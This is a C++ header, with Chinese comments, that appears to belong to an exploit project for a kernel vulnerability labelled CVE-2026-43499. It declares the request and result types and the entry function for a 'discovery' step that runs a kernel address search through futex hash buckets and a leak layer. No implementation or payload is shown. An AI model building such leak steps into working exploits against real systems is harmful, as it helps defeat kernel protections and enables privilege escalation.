#pragma once
/** @file backend/cve_2026_43499/steps/discovery_runner.hpp
 *  发现那一段的执行体：区域、队列字与走查都就位时，跑一次内核地址搜索。
 *
 *  配方照本树自己的设备探针（`tools/snitch_run_probe.cpp`）：队列字映射在调用方自己的区域里、
 *  buckets 用 futex 哈希表、地址表就是这些字本身的地址。设备专用（要 `snitch_seam_linux`）。
 *
 *  边界：本层不做规划、不改走查——输入是什么就走什么；判决名借用 leak 层那一个。
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/scan_bounds.hpp"
#include "backend/cve_2026_43499/leak/snitch_region.hpp"
#include "backend/cve_2026_43499/leak/snitch_run.hpp"
#include "backend/cve_2026_43499/leak/snitch_scan.hpp"
#include "backend/cve_2026_43499/leak/snitch_setup.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    /** What the discovery step is given: the mapped inputs, the window it scans, and the counter. */
    struct DiscoveryRequest final {
        leak::SnitchSetup setup{};
        leak::RegionInputs region{};
        leak::SnitchPatience patience{};
        leak::ScanStrides strides{};
        leak::ScanRange range{};
        std::size_t counter_offset = 0U;
        bool sweep_tags = false;
    };

    /** What came of it: the leak layer"s verdict name, and the numbers it reported. */
    struct DiscoveryOutcome final {
        const char *verdict = nullptr;
        std::uint64_t found = 0U;
        std::size_t probes = 0U;
        std::uint32_t rounds = 0U;
        std::size_t pokes_wanted = 0U;
        std::int32_t error = 0;
    };

    /** Run the search once. @return true when it ran (whatever it found), false with a named
     *  reason when it could not even start (mapping the words region failed). */
    [[nodiscard]] bool run_discovery(DiscoveryRequest &request, DiscoveryOutcome &out,
                                     const char **refusal) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::steps
